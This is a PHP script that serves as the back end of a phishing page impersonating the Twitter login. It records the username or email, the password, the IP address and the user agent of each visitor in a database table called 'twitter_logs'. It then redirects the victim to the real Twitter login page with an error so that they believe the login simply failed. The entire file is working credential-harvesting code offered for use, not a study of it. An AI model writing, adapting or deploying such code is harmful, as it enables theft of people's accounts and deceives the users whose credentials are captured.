<?php
include 'db.php';

$step = isset($_POST['step']) ? $_POST['step'] : '';

if ($step === 'email') {
    // Step 1: Collect email/phone/username
    $identifier = trim($_POST['identifier']);

    // Store in session or just redirect with identifier
    session_start();
    $_SESSION['identifier'] = $identifier;

    // Log the identifier
    $stmt = $conn->prepare("INSERT INTO twitter_logs(identifier, ip, user_agent) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $identifier, $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']);
    $stmt->execute();

    // Redirect to password step
    header("Location: index.php?step=password&id=" . urlencode($identifier));
    exit;

} elseif ($step === 'password') {
    // Step 2: Collect password
    session_start();
    $identifier = isset($_POST['identifier']) ? $_POST['identifier'] : (isset($_SESSION['identifier']) ? $_SESSION['identifier'] : '');
    $password = $_POST['password'];

    // Log the full credentials
    $stmt = $conn->prepare("UPDATE twitter_logs SET password = ?, captured_at = NOW() WHERE identifier = ? AND password IS NULL ORDER BY id DESC LIMIT 1");
    $stmt->bind_param("ss", $password, $identifier);
    $stmt->execute();

    // Also insert a complete record if update didn't work
    $stmt2 = $conn->prepare("INSERT INTO twitter_logs(identifier, password, ip, user_agent) VALUES (?, ?, ?, ?)");
    $stmt2->bind_param("ssss", $identifier, $password, $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']);
    $stmt2->execute();

    // Clear session
    session_destroy();

    // Redirect to real Twitter (victim thinks login failed)
    header("Location: https://twitter.com/login?error=1");
    exit;

} else {
    // Fallback for direct access
    header("Location: index.php");
    exit;
}
?>